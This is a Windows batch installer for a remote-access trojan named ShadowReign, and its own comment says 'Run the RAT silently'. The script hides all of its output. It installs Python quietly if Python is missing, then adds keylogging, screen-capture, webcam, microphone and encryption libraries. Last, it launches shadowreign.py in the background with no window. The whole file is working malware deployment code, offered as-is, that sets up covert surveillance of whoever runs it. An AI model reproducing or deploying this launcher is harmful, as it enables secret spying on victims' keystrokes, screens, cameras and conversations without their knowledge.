@echo off
>nul 2>&1 echo Setting up ShadowReign environment...

REM Check if Python is installed
python --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    >nul 2>&1 echo Python not found. Downloading and installing...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe' -OutFile '%TEMP%\python_installer.exe'" >nul 2>&1
    %TEMP%\python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 >nul 2>&1
    del %TEMP%\python_installer.exe >nul 2>&1
    >nul 2>&1 echo Waiting for Python to install...
    timeout /t 10 >nul 2>&1
)

REM Ensure Python is in PATH
set PATH=%ProgramFiles%\Python311;%ProgramFiles%\Python311\Scripts;%PATH%

REM Verify Python
python --version >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    >nul 2>&1 echo Failed to install Python. Please run as administrator or check internet connection.
    exit /b 1
)

REM Ensure pip is installed
python -m ensurepip --upgrade >nul 2>&1
python -m pip install --upgrade pip >nul 2>&1

REM Install required libraries
>nul 2>&1 echo Installing required libraries...
python -m pip install pynput mss opencv-python pyaudio pyttsx3 psutil pycryptodome numpy >nul 2>&1

REM Run the RAT silently
start /B pythonw shadowreign.py >nul 2>&1

REM Clean up and exit
exit /b 0
